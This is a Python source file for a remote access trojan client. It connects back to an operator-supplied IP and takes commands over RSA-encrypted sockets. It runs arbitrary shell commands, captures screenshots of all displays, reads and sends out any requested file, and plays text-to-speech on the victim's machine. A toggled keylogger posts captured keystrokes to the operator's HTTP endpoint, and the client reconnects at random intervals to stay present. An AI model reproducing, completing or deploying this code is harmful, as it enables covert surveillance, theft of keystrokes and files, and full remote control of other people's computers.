import socket, time, random, rsa, os
import subprocess, getpass
from PIL import ImageGrab
from io import BytesIO
import pyttsx3
import requests
import threading
from pynput import keyboard
import json

my_api_key = 'Your_custom_api_key_here'
my_api_port = 55668 #feel free to change this.
my_ip = 'your_ip_here'
my_socket_port = 55667 #feel free to change this.
#Fetch personal stuff, You should hardcode these. Obviously.
with open('personal.json', 'r') as file:
    settings = json.load(file)
    my_api_key = settings.get('apiKey', None)
    my_ip = settings.get('ip', None)
#Fetch personal stuff, You should hardcode these. Obviously.

keylogger = False
keys = []
headers = {"X-API-Key": my_api_key}
url = f"http://{my_ip}:{my_api_port}/"

publicKey, privateKey = rsa.newkeys(1024)
serverKey = ''
headerSize = 10
def encrypt(string):
    if type(string) == bytes:
        return [rsa.encrypt(packet, serverKey) for packet in [string[i*100:(i+1)*100] for i in range(-(-len(string)//100))]]
    else:
        return [rsa.encrypt(packet, serverKey) for packet in [string[i*100:(i+1)*100].encode('utf-8') for i in range(-(-len(string)//100))]]

def send(packets: list, s):
    s.sendall(rsa.encrypt(str(len(packets)).encode('utf-8'), serverKey))
    for packet in packets:
        s.sendall(packet)

def on_press(key):
    global keylogger
    try:
        if keylogger:
            if len(keys) < 15:
                keys.append(key)
            else:
                last = [keys.pop(0) for _ in range(len(keys))]
                keys.clear()
                requests.post(url+'keys', headers=headers, json={'keys': [list(rsa.encrypt(str(k).encode('utf-8'), serverKey)) for k in last]})
                keys.append(key)
        elif len(keys) > 0:
            last = [keys.pop(0) for _ in range(len(keys))]
            keys.clear()
            requests.post(url+'keys', headers=headers, json={'keys': [list(rsa.encrypt(str(k).encode('utf-8'), serverKey)) for k in last]})
    except Exception as e:
        keylogger = False
        print(f'Keylogger error: {e}')

def listen_for_keypress():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=listen_for_keypress, daemon=True).start()
while True: 
    try:
        closed = False
        print('Trying to connect...')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((my_ip, my_socket_port))
        print('Connected!')
        serverKey = rsa.PublicKey.load_pkcs1(s.recv(1024))
        s.sendall(publicKey.save_pkcs1('PEM'))
        print('RSA keys exchanged.')
        s.sendall(rsa.encrypt(getpass.getuser().encode('utf-8'), serverKey))
        print('Name provided. Waiting for commands...')
        while True:
            data = ''
            packetsAmount = int(rsa.decrypt(s.recv(128), privateKey).decode('utf-8'))
            for _ in range(packetsAmount):
                data += rsa.decrypt(s.recv(128), privateKey).decode('utf-8')
            header = data[:headerSize].strip()
            data = data[headerSize:]
            if header == 'exit':
                closed == True
                s.close()
                break
            elif header == 'cmd:':
                command = data
                output = subprocess.run(command.split(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if output.stderr == '':
                    packets = encrypt(output.stdout.strip())
                else:
                    packets = encrypt(output.stderr.strip())
                if packets == []:
                    send(encrypt('No output'), s)
                else:
                    send(packets, s)
            elif header == 'sc:':
                image_bytes = BytesIO()
                try:
                    ImageGrab.grab(all_screens=True).save(image_bytes, format='JPEG', quality=abs(int(data)))
                except:
                    ImageGrab.grab(all_screens=True).save(image_bytes, format='JPEG', quality=10)
                bytes_data = image_bytes.getvalue()
                send(encrypt(bytes_data), s)
            elif header == 'file:':
                filePath = data
                if os.path.exists(filePath):
                    with open(filePath, 'rb') as file:
                        bytes_data = file.read()
                        print(bytes_data)
                    send(encrypt(bytes_data), s)
                else:
                    send(encrypt('Invalid path'), s)
            elif header == 'tts:':
                try:
                    data = data.split(';')
                    text = ''.join(data[:-2])
                    volume = data[-2]
                    rate = data[-1]
                    engine = pyttsx3.init()
                    engine.setProperty('volume', int(volume)/100)
                    engine.setProperty('rate', int(rate))
                    engine.say(text)
                    send(encrypt('True'), s)
                    engine.runAndWait()
                    engine.stop()
                    requests.get(url+'tts', headers=headers)
                except Exception as ttsError:
                    send(encrypt(ttsError), s)
            elif header == 'keylog:':
                keylogger = not keylogger
                send(encrypt(f'{keylogger}'), s)
    except Exception as e:
        print(f'{e} | ', end='')
    wait = random.randint(60, 180)
    print(f'waiting {wait} seconds before reconnecting...')
    time.sleep(wait)